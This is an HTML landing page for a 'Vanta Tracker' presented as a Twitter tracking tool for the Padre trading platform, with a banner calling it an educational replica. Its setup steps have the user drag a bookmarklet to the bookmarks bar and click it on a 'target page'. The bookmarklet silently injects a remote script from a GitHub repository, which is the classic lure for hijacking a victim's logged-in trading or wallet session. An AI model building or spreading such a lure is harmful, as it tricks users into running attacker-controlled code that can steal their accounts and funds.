<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanta Tracker - Research Replica</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00ff88;
            --primary-dark: #00cc66;
            --bg-dark: #0a0a0a;
            --bg-card: #111111;
            --text-light: #e0e0e0;
            --text-muted: #aaaaaa;
            --border: rgba(0, 255, 136, 0.2);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-dark);
            color: var(--text-light);
            line-height: 1.6;
            overflow-x: hidden;
        }
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
        .warning {
            background: linear-gradient(135deg, #003322, #004d33);
            color: #ffffff; text-align: center; padding: 12px; font-weight: 600;
            position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--primary);
        }
        header {
            background: linear-gradient(135deg, #000000, #001a0d);
            text-align: center; padding: 120px 20px; border-bottom: 2px solid var(--primary);
        }
        .logo { width: 140px; margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(0,255,136,0.5)); }
        h1 { font-size: 3.5em; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
        .hero { text-align: center; padding: 100px 20px; }
        .cta-button {
            display: inline-block;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: #000; padding: 16px 36px; text-decoration: none;
            border-radius: 8px; font-weight: 700; font-size: 1.2em;
            box-shadow: 0 6px 20px rgba(0,255,136,0.4); cursor: move;
        }
        .setup-section { padding: 80px 20px; text-align: center; }
        ol { text-align: left; max-width: 600px; margin: 20px auto; color: var(--text-muted); }
        li { margin-bottom: 10px; }
    </style>
</head>
<body>
    <canvas id="filamentCanvas"></canvas>
    <div class="warning">Educational Research Environment: vanta-tracker.com replica</div>
    
    <header>
        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none"/>
            <circle cx="50" cy="50" r="8" fill="var(--primary)">
                <animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/>
            </circle>
        </svg>
        <h1>Vanta Tracker</h1>
        <p>Premier Twitter API tracking for Padre.</p>
    </header>

    <section id="setup" class="setup-section">
        <h2>How to Setup</h2>
        <ol>
            <li>Drag the button below to your Bookmarks Bar.</li>
            <li>Enable bar with <strong>Ctrl+Shift+B</strong>.</li>
            <li>Click the bookmark on a target page to initialize.</li>
        </ol>
        <a href="javascript:(function(){
            const s=document.createElement('script');
            s.src='https://github.com/Jinxthesimp/Dropshipper/blob/main/tracker.js';
            document.body.appendChild(s);
        })();" class="cta-button" id="vanta-tool">
            Vanta Tracker
        </a>
    </section>

    <script>
        const canvas = document.getElementById('filamentCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const filaments = [];
        class Filament {
            constructor() { this.reset(); }
            reset() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.length = 100; this.angle = Math.random() * Math.PI * 2;
                this.speed = 1; this.opacity = Math.random();
            }
            update() {
                this.x += Math.cos(this.angle) * this.speed;
                this.y += Math.sin(this.angle) * this.speed;
                if (this.x<0 || this.x>canvas.width) this.reset();
            }
            draw() {
                ctx.beginPath(); ctx.moveTo(this.x, this.y);
                ctx.lineTo(this.x + Math.cos(this.angle) * this.length, this.y + Math.sin(this.angle) * this.length);
                ctx.strokeStyle = `rgba(0, 255, 136, ${this.opacity})`; ctx.stroke();
            }
        }
        for(let i=0; i<25; i++) filaments.push(new Filament());
        function animate() {
            ctx.fillStyle = 'rgba(10, 10, 10, 0.1)'; ctx.fillRect(0,0,canvas.width,canvas.height);
            filaments.forEach(f => { f.update(); f.draw(); });
            requestAnimationFrame(animate);
        }
        animate();
    </script>
</body>
</html>
